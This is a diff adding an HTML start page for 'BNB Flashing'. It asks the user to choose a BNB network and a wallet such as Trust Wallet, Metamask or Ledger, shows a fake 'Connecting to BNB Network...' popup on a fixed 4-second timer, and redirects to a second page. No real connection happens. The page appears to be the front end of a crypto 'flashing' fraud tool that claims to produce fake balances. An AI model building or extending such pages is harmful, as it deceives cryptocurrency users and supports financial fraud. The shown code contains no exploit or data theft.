@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BNB Flashing - Start</title>
+  <style>
+    body {
+      background: #000;
+      font-family: 'Segoe UI', sans-serif;
+      color: #f3ba2f;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      text-shadow: 0 0 10px #f3ba2f;
+    }
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      background-color: #111;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #f3ba2f;
+    }
+    label {
+      display: block;
+      margin: 20px 0 10px;
+      font-weight: bold;
+    }
+    select {
+      width: 100%;
+      padding: 10px;
+      background: #222;
+      color: #f3ba2f;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+    button {
+      margin-top: 30px;
+      padding: 12px 25px;
+      font-size: 16px;
+      background: #f3ba2f;
+      color: #000;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 10px #f3ba2f;
+    }
+    button:hover {
+      background: #ffd166;
+    }
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #111;
+      border: 2px solid #f3ba2f;
+      padding: 20px 30px;
+      color: #f3ba2f;
+      font-size: 18px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px #f3ba2f;
+      display: none;
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Start BNB Flashing</h1>
+  <div class="container">
+    <label for="network">Select BNB Network:</label>
+    <select id="network">
+      <option value=""> Choose Network</option>
+      <option>BNB Smart Chain (BEP20)</option>
+      <option>BNB Beacon Chain (BEP2)</option>
+      <option>BNB Greenfield</option>
+      <option>BNB CrossChain</option>
+      <option>BNB Testnet</option>
+    </select>
+
+    <label for="wallet">Select BNB Wallet:</label>
+    <select id="wallet">
+      <option value="">Choose Wallet</option>
+      <option>Binance</option>
+      <option>Trust Wallet</option>
+      <option>Metamask</option>
+      <option>TokenPocket</option>
+      <option>SafePal</option>
+      <option>Math Wallet</option>
+      <option>BitKeep</option>
+      <option>OKX</option>
+      <option>Coin98</option>
+      <option>Ledger</option>
+    </select>
+
+    <button onclick="startFlashing()">Start Flashing</button>
+  </div>
+
+  <div class="popup" id="popup">Connecting to BNB Network...</div>
+
+  <script>
+    function startFlashing() {
+      const network = document.getElementById("network").value;
+      const wallet = document.getElementById("wallet").value;
+
+      if (!network || !wallet) {
+        alert("Please select both network and wallet.");
+        return;
+      }
+
+      const popup = document.getElementById("popup");
+      popup.style.display = "block";
+
+      setTimeout(() => {
+        popup.style.display = "none";
+        const url = `bnb2.html?network=${encodeURIComponent(network)}&wallet=${encodeURIComponent(wallet)}`;
+        window.location.href = url;
+      }, 4000); // 4 seconds popup before redirection
+    }
+  </script>
+
+</body>
+</html>
